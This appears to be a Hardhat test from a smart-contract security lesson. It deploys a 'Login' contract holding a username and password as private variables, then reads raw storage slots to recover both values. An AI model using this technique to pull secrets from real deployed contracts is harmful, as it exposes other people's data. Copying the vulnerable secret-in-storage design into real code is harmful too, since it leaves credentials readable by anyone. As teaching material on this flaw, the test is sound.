const { expect } = require("chai");
const hre = require("hardhat");

describe("Attack", () => {
  it("Should be able to read the private variables password and username", async () => {
    // To save space, we would convert the string to bytes32 array
    const usernameBytes = hre.ethers.encodeBytes32String("test");
    const passwordBytes = hre.ethers.encodeBytes32String("password");

    // Deploy the Login Contract
    const loginContract = await hre.ethers.deployContract("Login", [
      usernameBytes,
      passwordBytes,
    ]);

    await loginContract.waitForDeployment();

    // Get the storage slot 0
    const slot0Bytes = await hre.ethers.provider.getStorage(
      loginContract.target,
      0
    );

    // Get the storage slot 1
    const slot1Bytes = await hre.ethers.provider.getStorage(
      loginContract.target,
      1
    );

    // We are able to extract the values of the private variables
    expect(hre.ethers.decodeBytes32String(slot0Bytes)).to.equal("test");
    expect(hre.ethers.decodeBytes32String(slot1Bytes)).to.equal("password");
  });
});
